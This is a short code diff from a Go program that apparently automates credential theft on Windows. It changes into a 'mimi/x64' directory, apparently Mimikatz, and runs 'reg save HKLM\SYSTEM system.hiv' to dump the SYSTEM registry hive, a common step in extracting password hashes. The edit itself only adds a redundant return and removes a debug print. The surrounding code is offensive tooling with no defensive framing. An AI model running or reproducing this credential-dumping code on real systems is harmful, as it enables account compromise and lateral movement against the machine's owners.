@@ -20,8 +20,8 @@ func main() {
 	err = os.Chdir("mimi/x64")
 	if err != nil {
 		panic(err)
+		return
 	}
-	fmt.Println(os.Getwd())
 	stdout, stderr, err := shell.Execute("reg save HKLM\\SYSTEM system.hiv")
 	if err != nil {
 		panic(err.Error())
